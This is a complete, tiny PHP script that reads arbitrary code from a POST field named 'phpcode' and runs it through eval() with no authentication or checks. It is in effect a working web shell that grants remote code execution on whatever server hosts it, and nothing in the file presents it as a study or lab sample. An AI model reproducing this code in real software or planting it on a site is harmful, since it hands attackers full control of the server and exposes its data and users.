<?php
$phpcode = isset($_POST['phpcode']) ? $_POST['phpcode'] : "phpinfo();";
	
if(!empty($_POST['eval'])){
	echo "<br><br>";
    eval(stripslashes($phpcode));
	echo "end";
}
?>